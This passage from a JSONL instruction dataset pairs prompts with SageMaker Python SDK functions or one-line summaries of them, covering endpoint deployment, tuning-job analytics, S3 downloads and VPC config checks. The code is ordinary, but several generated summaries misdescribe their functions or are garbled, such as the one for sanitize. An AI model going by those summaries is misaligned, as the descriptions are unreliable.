self.sagemaker_session:\n            if instance_type in ('local', 'local_gpu'):\n                self.sagemaker_session = local.LocalSession()\n            else:\n                self.sagemaker_session = session.Session()\n\n        if self.role is None:\n            raise ValueError(\"Role can not be null for deploying a model\")\n\n        compiled_model_suffix = '-'.join(instance_type.split('.')[:-1])\n        if self._is_compiled_model:\n            self.name += compiled_model_suffix\n\n        self._create_sagemaker_model(instance_type, accelerator_type, tags)\n        production_variant = sagemaker.production_variant(self.name, instance_type, initial_instance_count,\n                                                          accelerator_type=accelerator_type)\n        if endpoint_name:\n            self.endpoint_name = endpoint_name\n        else:\n            self.endpoint_name = self.name\n            if self._is_compiled_model and not self.endpoint_name.endswith(compiled_model_suffix):\n                self.endpoint_name += compiled_model_suffix\n\n        if update_endpoint:\n            endpoint_config_name = self.sagemaker_session.create_endpoint_config(\n                name=self.name,\n                model_name=self.name,\n                initial_instance_count=initial_instance_count,\n                instance_type=instance_type,\n                accelerator_type=accelerator_type,\n                tags=tags,\n                kms_key=kms_key)\n            self.sagemaker_session.update_endpoint(self.endpoint_name, endpoint_config_name)\n        else:\n            self.sagemaker_session.endpoint_from_production_variants(self.endpoint_name, [production_variant],\n                                                                     tags, kms_key)\n\n        if self.predictor_cls:\n            return self.predictor_cls(self.endpoint_name, self.sagemaker_session)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a Transformer that uses this Model.", "response": "def transformer(self, instance_count, instance_type, strategy=None, assemble_with=None, output_path=None,\n                    output_kms_key=None, accept=None, env=None, max_concurrent_transforms=None,\n                    max_payload=None, tags=None, volume_kms_key=None):\n        \"\"\"Return a ``Transformer`` that uses this Model.\n\n        Args:\n            instance_count (int): Number of EC2 instances to use.\n            instance_type (str): Type of EC2 instance to use, for example, 'ml.c4.xlarge'.\n            strategy (str): The strategy used to decide how to batch records in a single request (default: None).\n                Valid values: 'MULTI_RECORD' and 'SINGLE_RECORD'.\n            assemble_with (str): How the output is assembled (default: None). Valid values: 'Line' or 'None'.\n            output_path (str): S3 location for saving the transform result. If not specified, results are stored to\n                a default bucket.\n            output_kms_key (str): Optional. KMS key ID for encrypting the transform output (default: None).\n            accept (str): The content type accepted by the endpoint deployed during the transform job.\n            env (dict): Environment variables to be set for use during the transform job (default: None).\n            max_concurrent_transforms (int): The maximum number of HTTP requests to be made to\n                each individual transform container at one time.\n            max_payload (int): Maximum size of the payload in a single HTTP request to the container in MB.\n            tags (list[dict]): List of tags for labeling a transform job. If none specified, then the tags used for\n                the training job are used for the transform job.\n            volume_kms_key (str): Optional. KMS key ID for encrypting the volume attached to the ML\n                compute instance (default: None).\n        \"\"\"\n        self._create_sagemaker_model(instance_type)\n        if self.enable_network_isolation():\n            env = None\n\n        return Transformer(self.name, instance_count, instance_type, strategy=strategy, assemble_with=assemble_with,\n                           output_path=output_path, output_kms_key=output_kms_key, accept=accept,\n                           max_concurrent_transforms=max_concurrent_transforms, max_payload=max_payload,\n                           env=env, tags=tags, base_transform_job_name=self.name,\n                           volume_kms_key=volume_kms_key, sagemaker_session=self.sagemaker_session)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning a SageMaker container definition object with framework configuration set in model environment variables.", "response": "def prepare_container_def(self, instance_type, accelerator_type=None):  # pylint disable=unused-argument\n        \"\"\"Return a container definition with framework configuration set in model environment variables.\n\n        This also uploads user-supplied code to S3.\n\n        Args:\n            instance_type (str): The EC2 instance type to deploy this Model to. For example, 'ml.p2.xlarge'.\n            accelerator_type (str): The Elastic Inference accelerator type to deploy to the instance for loading and\n                making inferences to the model. For example, 'ml.eia1.medium'.\n\n        Returns:\n            dict[str, str]: A container definition object usable with the CreateModel API.\n        \"\"\"\n        deploy_key_prefix = fw_utils.model_code_key_prefix(self.key_prefix, self.name, self.image)\n        self._upload_code(deploy_key_prefix)\n        deploy_env = dict(self.env)\n        deploy_env.update(self._framework_env_vars())\n        return sagemaker.container_def(self.image, self.model_data, deploy_env)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a SageMaker Model Entity and return the ModelPackage.", "response": "def _create_sagemaker_model(self, *args):  # pylint: disable=unused-argument\n        \"\"\"Create a SageMaker Model Entity\n\n        Args:\n            *args: Arguments coming from the caller. This class\n                does not require any so they are ignored.\n        \"\"\"\n        if self.algorithm_arn:\n            # When ModelPackage is created using an algorithm_arn we need to first\n            # create a ModelPackage. If we had already created one then its fine to re-use it.\n            if self._created_model_package_name is None:\n                model_package_name = self._create_sagemaker_model_package()\n                self.sagemaker_session.wait_for_model_package(model_package_name)\n                self._created_model_package_name = model_package_name\n            model_package_name = self._created_model_package_name\n        else:\n            # When a ModelPackageArn is provided we just create the Model\n            model_package_name = self.model_package_arn\n\n        container_def = {\n            'ModelPackageName': model_package_name,\n        }\n\n        if self.env != {}:\n            container_def['Environment'] = self.env\n\n        model_package_short_name = model_package_name.split('/')[-1]\n        enable_network_isolation = self.enable_network_isolation()\n        self.name = self.name or utils.name_from_base(model_package_short_name)\n        self.sagemaker_session.create_model(self.name, self.role, container_def,\n                                            vpc_config=self.vpc_config,\n                                            enable_network_isolation=enable_network_isolation)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the inference from the specified endpoint.", "response": "def predict(self, data, initial_args=None):\n        \"\"\"Return the inference from the specified endpoint.\n\n        Args:\n            data (object): Input data for which you want the model to provide inference.\n                If a serializer was specified when creating the RealTimePredictor, the result of the\n                serializer is sent as input data. Otherwise the data must be sequence of bytes, and\n                the predict method then sends the bytes in the request body as is.\n            initial_args (dict[str,str]): Optional. Default arguments for boto3\n                ``invoke_endpoint`` call. Default is None (no default arguments).\n\n        Returns:\n            object: Inference for the given input. If a deserializer was specified when creating\n                the RealTimePredictor, the result of the deserializer is returned. Otherwise the response\n                returns the sequence of bytes as is.\n        \"\"\"\n\n        request_args = self._create_request_args(data, initial_args)\n        response = self.sagemaker_session.sagemaker_runtime_client.invoke_endpoint(**request_args)\n        return self._handle_response(response)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef delete_endpoint(self, delete_endpoint_config=True):\n        if delete_endpoint_config:\n            self._delete_endpoint_config()\n\n        self.sagemaker_session.delete_endpoint(self.endpoint)", "response": "Delete the Amazon SageMaker endpoint backing this predictor."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef delete_model(self):\n        request_failed = False\n        failed_models = []\n        for model_name in self._model_names:\n            try:\n                self.sagemaker_session.delete_model(model_name)\n            except Exception:  # pylint: disable=broad-except\n                request_failed = True\n                failed_models.append(model_name)\n\n        if request_failed:\n            raise Exception('One or more models cannot be deleted, please retry. \\n'\n                            'Failed models: {}'.format(', '.join(failed_models)))", "response": "Deletes the Amazon SageMaker models backing this predictor."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nclear the local cache of all local data structures.", "response": "def clear_cache(self):\n        \"\"\"Clear the object of all local caches of API methods.\n        \"\"\"\n        super(HyperparameterTuningJobAnalytics, self).clear_cache()\n        self._tuning_job_describe_result = None\n        self._training_job_summaries = None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef description(self, force_refresh=False):\n        if force_refresh:\n            self.clear_cache()\n        if not self._tuning_job_describe_result:\n            self._tuning_job_describe_result = self._sage_client.describe_hyper_parameter_tuning_job(\n                HyperParameterTuningJobName=self.name\n            )\n        return self._tuning_job_describe_result", "response": "Get the description of the hyperparameter tuning job."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef training_job_summaries(self, force_refresh=False):\n        if force_refresh:\n            self.clear_cache()\n        if self._training_job_summaries is not None:\n            return self._training_job_summaries\n        output = []\n        next_args = {}\n        for count in range(100):\n            logging.debug(\"Calling list_training_jobs_for_hyper_parameter_tuning_job %d\" % count)\n            raw_result = self._sage_client.list_training_jobs_for_hyper_parameter_tuning_job(\n                HyperParameterTuningJobName=self.name, MaxResults=100, **next_args\n            )\n            new_output = raw_result['TrainingJobSummaries']\n            output.extend(new_output)\n            logging.debug(\"Got %d more TrainingJobs. Total so far: %d\" % (len(new_output), len(output)))\n            if ('NextToken' in raw_result) and (len(new_output) > 0):\n                next_args['NextToken'] = raw_result['NextToken']\n            else:\n                break\n        self._training_job_summaries = output\n        return output", "response": "A list of all training jobs for a hyperparameter tuning job."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef clear_cache(self):\n        super(TrainingJobAnalytics, self).clear_cache()\n        self._data = defaultdict(list)\n        self._time_interval = self._determine_timeinterval()", "response": "Clear the local cache of all API methods so\n        is not used."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _determine_timeinterval(self):\n        description = self._sage_client.describe_training_job(TrainingJobName=self.name)\n        start_time = self._start_time or description[u'TrainingStartTime']  # datetime object\n        # Incrementing end time by 1 min since CloudWatch drops seconds before finding the logs.\n        # This results in logs being searched in the time range in which the correct log line was not present.\n        # Example - Log time - 2018-10-22 08:25:55\n        #           Here calculated end time would also be 2018-10-22 08:25:55 (without 1 min addition)\n        #           CW will consider end time as 2018-10-22 08:25 and will not be able to search the correct log.\n        end_time = self._end_time or description.get(\n            u'TrainingEndTime', datetime.datetime.utcnow()) + datetime.timedelta(minutes=1)\n\n        return {\n            'start_time': start_time,\n            'end_time': end_time,\n        }", "response": "Return a dictionary with two datetime objects start_time and end_time covering the interval of the training job."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nfetching all the values of a named metric and add them to _data", "response": "def _fetch_metric(self, metric_name):\n        \"\"\"Fetch all the values of a named metric, and add them to _data\n        \"\"\"\n        request = {\n            'Namespace': self.CLOUDWATCH_NAMESPACE,\n            'MetricName': metric_name,\n            'Dimensions': [\n                {\n                    'Name': 'TrainingJobName',\n                    'Value': self.name\n                }\n            ],\n            'StartTime': self._time_interval['start_time'],\n            'EndTime': self._time_interval['end_time'],\n            'Period': self._period,\n            'Statistics': ['Average'],\n        }\n        raw_cwm_data = self._cloudwatch.get_metric_statistics(**request)['Datapoints']\n        if len(raw_cwm_data) == 0:\n            logging.warning(\"Warning: No metrics called %s found\" % metric_name)\n            return\n\n        # Process data: normalize to starting time, and sort.\n        base_time = min(raw_cwm_data, key=lambda pt: pt['Timestamp'])['Timestamp']\n        all_xy = []\n        for pt in raw_cwm_data:\n            y = pt['Average']\n            x = (pt['Timestamp'] - base_time).total_seconds()\n            all_xy.append([x, y])\n        all_xy = sorted(all_xy, key=lambda x: x[0])\n\n        # Store everything in _data to make a dataframe from\n        for elapsed_seconds, value in all_xy:\n            self._add_single_metric(elapsed_seconds, metric_name, value)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nstores a single metric in the _data dict which can be converted to a dataframe.", "response": "def _add_single_metric(self, timestamp, metric_name, value):\n        \"\"\"Store a single metric in the _data dict which can be\n        converted to a dataframe.\n        \"\"\"\n        # note that this method is built this way to make it possible to\n        # support live-refreshing charts in Bokeh at some point in the future.\n        self._data['timestamp'].append(timestamp)\n        self._data['metric_name'].append(metric_name)\n        self._data['value'].append(value)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating a unique name from a base string.", "response": "def name_from_base(base, max_length=63, short=False):\n    \"\"\"Append a timestamp to the provided string.\n\n    This function assures that the total length of the resulting string is not\n    longer than the specified max length, trimming the input parameter if necessary.\n\n    Args:\n        base (str): String used as prefix to generate the unique name.\n        max_length (int): Maximum length for the resulting string.\n        short (bool): Whether or not to use a truncated timestamp.\n\n    Returns:\n        str: Input parameter with appended timestamp.\n    \"\"\"\n    timestamp = sagemaker_short_timestamp() if short else sagemaker_timestamp()\n    trimmed_base = base[:max_length - len(timestamp) - 1]\n    return '{}-{}'.format(trimmed_base, timestamp)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef base_name_from_image(image):\n    m = re.match(\"^(.+/)?([^:/]+)(:[^:]+)?$\", image)\n    algo_name = m.group(2) if m else image\n    return algo_name", "response": "Extract the base name of the image to use as the algorithm name for the job."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a timestamp with millisecond precision.", "response": "def sagemaker_timestamp():\n    \"\"\"Return a timestamp with millisecond precision.\"\"\"\n    moment = time.time()\n    moment_ms = repr(moment).split('.')[1][:3]\n    return time.strftime(\"%Y-%m-%d-%H-%M-%S-{}\".format(moment_ms), time.gmtime(moment))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nprint the function name and arguments for debugging.", "response": "def debug(func):\n    \"\"\"Print the function name and arguments for debugging.\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        print(\"{} args: {} kwargs: {}\".format(func.__name__, args, kwargs))\n        return func(*args, **kwargs)\n\n    return wrapper"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting the input value to a string.", "response": "def to_str(value):\n    \"\"\"Convert the input to a string, unless it is a unicode string in Python 2.\n\n    Unicode strings are supported as native strings in Python 3, but ``str()`` cannot be\n    invoked on unicode strings in Python 2, so we need to check for that case when\n    converting user-specified values to strings.\n\n    Args:\n        value: The value to convert to a string.\n\n    Returns:\n        str or unicode: The string representation of the value or the unicode string itself.\n    \"\"\"\n    if sys.version_info.major < 3 and isinstance(value, six.string_types):\n        return value\n    return str(value)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef extract_name_from_job_arn(arn):\n    slash_pos = arn.find('/')\n    if slash_pos == -1:\n        raise ValueError(\"Cannot parse invalid ARN: %s\" % arn)\n    return arn[(slash_pos + 1):]", "response": "Returns the name used in the API given a full ARN for a training job\n    or hyperparameter tuning job."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a string containing last modified time and the secondary training job status message.", "response": "def secondary_training_status_message(job_description, prev_description):\n    \"\"\"Returns a string contains last modified time and the secondary training job status message.\n\n    Args:\n        job_description: Returned response from DescribeTrainingJob call\n        prev_description: Previous job description from DescribeTrainingJob call\n\n    Returns:\n        str: Job status string to be printed.\n\n    \"\"\"\n\n    if job_description is None or job_description.get('SecondaryStatusTransitions') is None\\\n            or len(job_description.get('SecondaryStatusTransitions')) == 0:\n        return ''\n\n    prev_description_secondary_transitions = prev_description.get('SecondaryStatusTransitions')\\\n        if prev_description is not None else None\n    prev_transitions_num = len(prev_description['SecondaryStatusTransitions'])\\\n        if prev_description_secondary_transitions is not None else 0\n    current_transitions = job_description['SecondaryStatusTransitions']\n\n    if len(current_transitions) == prev_transitions_num:\n        # Secondary status is not changed but the message changed.\n        transitions_to_print = current_transitions[-1:]\n    else:\n        # Secondary status is changed we need to print all the entries.\n        transitions_to_print = current_transitions[prev_transitions_num - len(current_transitions):]\n\n    status_strs = []\n    for transition in transitions_to_print:\n        message = transition['StatusMessage']\n        time_str = datetime.utcfromtimestamp(\n            time.mktime(job_description['LastModifiedTime'].timetuple())).strftime('%Y-%m-%d %H:%M:%S')\n        status_strs.append('{} {} - {}'.format(time_str, transition['Status'], message))\n\n    return '\\n'.join(status_strs)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ndownload a folder from S3 to a local path.", "response": "def download_folder(bucket_name, prefix, target, sagemaker_session):\n    \"\"\"Download a folder from S3 to a local path\n\n    Args:\n        bucket_name (str): S3 bucket name\n        prefix (str): S3 prefix within the bucket that will be downloaded. Can be a single file.\n        target (str): destination path where the downloaded items will be placed\n        sagemaker_session (:class:`sagemaker.session.Session`): a sagemaker session to interact with S3.\n    \"\"\"\n    boto_session = sagemaker_session.boto_session\n\n    s3 = boto_session.resource('s3')\n    bucket = s3.Bucket(bucket_name)\n\n    prefix = prefix.lstrip('/')\n\n    # there is a chance that the prefix points to a file and not a 'directory' if that is the case\n    # we should just download it.\n    objects = list(bucket.objects.filter(Prefix=prefix))\n\n    if len(objects) > 0 and objects[0].key == prefix and prefix[-1] != '/':\n        s3.Object(bucket_name, prefix).download_file(os.path.join(target, os.path.basename(prefix)))\n        return\n\n    # the prefix points to an s3 'directory' download the whole thing\n    for obj_sum in bucket.objects.filter(Prefix=prefix):\n        # if obj_sum is a folder object skip it.\n        if obj_sum.key != '' and obj_sum.key[-1] == '/':\n            continue\n        obj = s3.Object(obj_sum.bucket_name, obj_sum.key)\n        s3_relative_path = obj_sum.key[len(prefix):].lstrip('/')\n        file_path = os.path.join(target, s3_relative_path)\n\n        try:\n            os.makedirs(os.path.dirname(file_path))\n        except OSError as exc:\n            # EEXIST means the folder already exists, this is safe to skip\n            # anything else will be raised.\n            if exc.errno != errno.EEXIST:\n                raise\n        obj.download_file(file_path)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_tar_file(source_files, target=None):\n    if target:\n        filename = target\n    else:\n        _, filename = tempfile.mkstemp()\n\n    with tarfile.open(filename, mode='w:gz') as t:\n        for sf in source_files:\n            # Add all files from the directory into the root of the directory structure of the tar\n            t.add(sf, arcname=os.path.basename(sf))\n    return filename", "response": "Create a tar file containing all the source_files"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndownloads a Single File from S3 into a local path.", "response": "def download_file(bucket_name, path, target, sagemaker_session):\n    \"\"\"Download a Single File from S3 into a local path\n\n    Args:\n        bucket_name (str): S3 bucket name\n        path (str): file path within the bucket\n        target (str): destination directory for the downloaded file.\n        sagemaker_session (:class:`sagemaker.session.Session`): a sagemaker session to interact with S3.\n    \"\"\"\n    path = path.lstrip('/')\n    boto_session = sagemaker_session.boto_session\n\n    s3 = boto_session.resource('s3')\n    bucket = s3.Bucket(bucket_name)\n    bucket.download_file(path, target)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _sync_directories(from_directory, to_directory):\n        if not os.path.exists(to_directory):\n            os.mkdir(to_directory)\n        for root, dirs, files in os.walk(from_directory):\n            to_root = root.replace(from_directory, to_directory)\n            for directory in dirs:\n                to_child_dir = os.path.join(to_root, directory)\n                if not os.path.exists(to_child_dir):\n                    os.mkdir(to_child_dir)\n            for fname in files:\n                from_file = os.path.join(root, fname)\n                to_file = os.path.join(to_root, fname)\n                with open(from_file, 'rb') as a, open(to_file, 'wb') as b:\n                    b.write(a.read())", "response": "Syncs the contents of from_directory to to_directory by copying each file in from_directory with new contents."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ncreating a TensorBoard process.", "response": "def create_tensorboard_process(self):\n        \"\"\"Create a TensorBoard process.\n\n        Returns:\n            tuple: A tuple containing:\n                int: The port number.\n                process: The TensorBoard process.\n\n        Raises:\n            OSError: If no ports between 6006 and 6105 are available for starting TensorBoard.\n        \"\"\"\n        port = 6006\n\n        for _ in range(100):\n            p = subprocess.Popen(\n                [\"tensorboard\", \"--logdir\", self.logdir, \"--host\", \"localhost\", \"--port\",\n                 str(port)],\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE\n            )\n            self.event.wait(5)\n            if p.poll():\n                port += 1\n            else:\n                return port, p\n\n        raise OSError(\n            'No available ports to start TensorBoard. Attempted all ports between 6006 and 6105')"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ntrains a model using the input training dataset.", "response": "def fit(self, inputs=None, wait=True, logs=True, job_name=None, run_tensorboard_locally=False):\n        \"\"\"Train a model using the input training dataset.\n\n        See :func:`~sagemaker.estimator.EstimatorBase.fit` for more details.\n\n        Args:\n            inputs (str or dict or sagemaker.session.s3_input): Information about the training data.\n                This can be one of three types:\n\n                * (str) - the S3 location where training data is saved.\n                * (dict[str, str] or dict[str, sagemaker.session.s3_input]) - If using multiple channels for\n                    training data, you can specify a dict mapping channel names\n                    to strings or :func:`~sagemaker.session.s3_input` objects.\n                * (sagemaker.session.s3_input) - channel configuration for S3 data sources that can provide\n                    additional information as well as the path to the training dataset.\n                    See :func:`sagemaker.session.s3_input` for full details.\n\n            wait (bool): Whether the call should wait until the job completes (default: True).\n            logs (bool): Whether to show the logs produced by the job.\n                Only meaningful when wait is True (default: True).\n            job_name (str): Training job name. If not specified, the estimator generates a default job name,\n                based on the training image name and current timestamp.\n            run_tensorboard_locally (bool): Whether to execute TensorBoard in a different process with\n                downloaded checkpoint information (default: False). This is an experimental feature, and requires\n                TensorBoard and AWS CLI to be installed. It terminates TensorBoard when execution ends.\n        \"\"\"\n\n        def fit_super():\n            super(TensorFlow, self).fit(inputs, wait, logs, job_name)\n\n        if run_tensorboard_locally and wait is False:\n            raise ValueError(\"Tensorboard is not supported with async fit\")\n\n        if self._script_mode_enabled() and run_tensorboard_locally:\n            LOGGER.warning(_SCRIPT_MODE_TENSORBOARD_WARNING.format(self.model_dir))\n            fit_super()\n        elif run_tensorboard_locally:\n            tensorboard = Tensorboard(self)\n            tensorboard.validate_requirements()\n\n            try:\n                tensorboard.start()\n                fit_super()\n            finally:\n                # sleep 20 secs for tensorboard start up if fit() quits instantly\n                time.sleep(20)\n                tensorboard.event.set()\n                tensorboard.join()\n        else:\n            fit_super()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _prepare_init_params_from_job_description(cls, job_details, model_channel_name=None):\n        init_params = super(TensorFlow, cls)._prepare_init_params_from_job_description(job_details,\n                                                                                       model_channel_name)\n\n        # Move some of the tensorflow specific init params from hyperparameters into the main init params.\n        for argument in ('checkpoint_path', 'training_steps', 'evaluation_steps', 'model_dir'):\n            value = init_params['hyperparameters'].pop(argument, None)\n            if value is not None:\n                init_params[argument] = value\n\n        image_name = init_params.pop('image')\n        framework, py_version, tag, script_mode = fw.framework_name_from_image(image_name)\n        if not framework:\n            # If we were unable to parse the framework name from the image it is not one of our\n            # officially supported images, in this case just add the image to the init params.\n            init_params['image_name'] = image_name\n            return init_params\n\n        if script_mode:\n            init_params['script_mode'] = True\n\n        init_params['py_version'] = py_version\n\n        # We switched image tagging scheme from regular image version (e.g. '1.0') to more expressive\n        # containing framework version, device type and python version (e.g. '1.5-gpu-py2').\n        # For backward compatibility map deprecated image tag '1.0' to a '1.4' framework version\n        # otherwise extract framework version from the tag itself.\n        init_params['framework_version'] = '1.4' if tag == '1.0' else fw.framework_version_from_tag(\n            tag)\n\n        training_job_name = init_params['base_job_name']\n        if framework != cls.__framework_name__:\n            raise ValueError(\"Training job: {} didn't use image for requested framework\".format(\n                training_job_name))\n\n        return init_params", "response": "Convert the job description to init params that can be handled by the class constructor."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a SageMaker TensorFlowModel object that can be deployed to an Endpoint.", "response": "def create_model(self, model_server_workers=None, role=None,\n                     vpc_config_override=VPC_CONFIG_DEFAULT, endpoint_type=None):\n        \"\"\"Create a SageMaker ``TensorFlowModel`` object that can be deployed to an ``Endpoint``.\n\n        Args:\n            role (str): The ``ExecutionRoleArn`` IAM Role ARN for the ``Model``, which is also used during\n                transform jobs. If not specified, the role from the Estimator will be used.\n            model_server_workers (int): Optional. The number of worker processes used by the inference server.\n                If None, server will use one worker per vCPU.\n            vpc_config_override (dict[str, list[str]]): Optional override for VpcConfig set on the model.\n                Default: use subnets and security groups from this Estimator.\n                * 'Subnets' (list[str]): List of subnet ids.\n                * 'SecurityGroupIds' (list[str]): List of security group ids.\n            endpoint_type: Optional. Selects the software stack used by the inference server.\n                If  not specified, the model will be configured to use the default\n                SageMaker model server. If 'tensorflow-serving', the model will be configured to\n                use the SageMaker Tensorflow Serving container.\n\n        Returns:\n            sagemaker.tensorflow.model.TensorFlowModel: A SageMaker ``TensorFlowModel`` object.\n                See :func:`~sagemaker.tensorflow.model.TensorFlowModel` for full details.\n        \"\"\"\n\n        role = role or self.role\n        if endpoint_type == 'tensorflow-serving' or self._script_mode_enabled():\n            return self._create_tfs_model(role=role, vpc_config_override=vpc_config_override)\n\n        return self._create_default_model(model_server_workers=model_server_workers, role=role,\n                                          vpc_config_override=vpc_config_override)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef hyperparameters(self):\n        hyperparameters = super(TensorFlow, self).hyperparameters()\n\n        self.checkpoint_path = self.checkpoint_path or self._default_s3_path('checkpoints')\n        mpi_enabled = False\n\n        if self._script_mode_enabled():\n            additional_hyperparameters = {}\n\n            if 'parameter_server' in self.distributions:\n                ps_enabled = self.distributions['parameter_server'].get('enabled', False)\n                additional_hyperparameters[self.LAUNCH_PS_ENV_NAME] = ps_enabled\n\n            if 'mpi' in self.distributions:\n                mpi_dict = self.distributions['mpi']\n                mpi_enabled = mpi_dict.get('enabled', False)\n                additional_hyperparameters[self.LAUNCH_MPI_ENV_NAME] = mpi_enabled\n                additional_hyperparameters[self.MPI_NUM_PROCESSES_PER_HOST] = mpi_dict.get('processes_per_host', 1)\n                additional_hyperparameters[self.MPI_CUSTOM_MPI_OPTIONS] = mpi_dict.get('custom_mpi_options', '')\n\n            self.model_dir = self.model_dir or self._default_s3_path('model', mpi=mpi_enabled)\n            additional_hyperparameters['model_dir'] = self.model_dir\n        else:\n            additional_hyperparameters = {'checkpoint_path': self.checkpoint_path,\n                                          'training_steps': self.training_steps,\n                                          'evaluation_steps': self.evaluation_steps,\n                                          'sagemaker_requirements': self.requirements_file}\n\n        hyperparameters.update(Framework._json_encode_hyperparameters(additional_hyperparameters))\n        return hyperparameters", "response": "Return hyperparameters used by your custom TensorFlow code during model training."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef from_dict(vpc_config, do_sanitize=False):\n    if do_sanitize:\n        vpc_config = sanitize(vpc_config)\n    if vpc_config is None:\n        return None, None\n    return vpc_config[SUBNETS_KEY], vpc_config[SECURITY_GROUP_IDS_KEY]", "response": "Extracts subnets and security group ids as lists from a VpcConfig dict containing SubnetIds and SecurityGroupId keys."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef sanitize(vpc_config):\n    if vpc_config is None:\n        return vpc_config\n    elif type(vpc_config) is not dict:\n        raise ValueError('vpc_config is not a dict: {}'.format(vpc_config))\n    elif not vpc_config:\n        raise ValueError('vpc_config is empty')\n\n    subnets = vpc_config.get(SUBNETS_KEY)\n    if subnets is None:\n        raise ValueError('vpc_config is missing key: {}'.format(SUBNETS_KEY))\n    if type(subnets) is not list:\n        raise ValueError('vpc_config value for {} is not a list: {}'.format(SUBNETS_KEY, subnets))\n    elif not subnets:\n        raise ValueError('vpc_config value for {} is empty'.format(SUBNETS_KEY))\n\n    security_group_ids = vpc_config.get(SECURITY_GROUP_IDS_KEY)\n    if security_group_ids is None:\n        raise ValueError('vpc_config is missing key: {}'.format(SECURITY_GROUP_IDS_KEY))\n    if type(security_group_ids) is not list:\n        raise ValueError('vpc_config value for {} is not a list: {}'.format(SECURITY_GROUP_IDS_KEY, security_group_ids))\n    elif not security_group_ids:\n        raise ValueError('vpc_config value for {} is empty'.format(SECURITY_GROUP_IDS_KEY))\n\n    return to_dict(subnets, security_group_ids)", "response": "Sanitize a VpcConfig dictionary to be used as a base for the cluster tree structure."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the SageMaker hyperparameters for training this KMeans Estimator", "response": "def hyperparameters(self):\n        \"\"\"Return the SageMaker hyperparameters for training this KMeans Estimator\"\"\"\n        hp_dict = dict(force_dense='True')  # KMeans requires this hp to fit on Record objects\n        hp_dict.update(super(KMeans, self).hyperparameters())\n        return hp_dict"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_identical_dataset_and_algorithm_tuner(parent, additional_parents=None, sagemaker_session=None):\n\n    parent_tuner = HyperparameterTuner.attach(tuning_job_name=parent, sagemaker_session=sagemaker_session)\n    return parent_tuner.identical_dataset_and_algorithm_tuner(additional_parents=additional_parents)", "response": "Creates a new HyperparameterTuner object which is a copy of the request fields from the provided parent to the new instance of\n        IdenticalDataAndAlgorithm and additional_parents."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef create_transfer_learning_tuner(parent, additional_parents=None, estimator=None, sagemaker_session=None):\n\n    parent_tuner = HyperparameterTuner.attach(tuning_job_name=parent, sagemaker_session=sagemaker_session)\n    return parent_tuner.transfer_learning_tuner(additional_parents=additional_parents,\n                                                estimator=estimator)", "response": "Creates a new instance of HyperparameterTuner that is a copy of the request fields from the provided parent to the new instance of HyperparameterTuner."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef from_job_desc(cls, warm_start_config):\n        if not warm_start_config or \\\n                WARM_START_TYPE not in warm_start_config or \\\n                PARENT_HYPERPARAMETER_TUNING_JOBS not in warm_start_config:\n            return None\n\n        parents = []\n        for parent in warm_start_config[PARENT_HYPERPARAMETER_TUNING_JOBS]:\n            parents.append(parent[HYPERPARAMETER_TUNING_JOB_NAME])\n\n        return cls(warm_start_type=WarmStartTypes(warm_start_config[WARM_START_TYPE]),\n                   parents=parents)", "response": "Creates an instance of this class from the given warm start configuration response."}
